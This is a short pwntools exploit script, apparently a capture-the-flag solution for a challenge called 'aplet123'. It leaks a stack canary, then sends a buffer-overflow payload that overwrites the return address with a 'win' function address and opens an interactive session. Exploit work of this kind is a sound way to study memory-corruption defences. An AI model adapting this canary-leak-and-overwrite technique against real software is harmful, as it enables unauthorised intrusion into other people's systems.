from pwn import * 

context.binary = elf = ELF('./aplet123')

if args['REMOTE']:
	io = remote('chall.lac.tf', 31123)
else:
	io = process([elf.path])
	gdb.attach(io)



io.recvuntil('hello\n')
io.sendline(b'a' * 69 + b'i\'m')
io.recvuntil(b'hi ')

win_address = p64(0x4011e6)
offset = b'a' * 8
leaked_canary = b'\0' + io.recv(7) 
padding = b'bye\0' + 68 * b'a'

payload = padding
payload += leaked_canary
payload += offset
payload += win_address

io.sendline(payload)

io.interactive()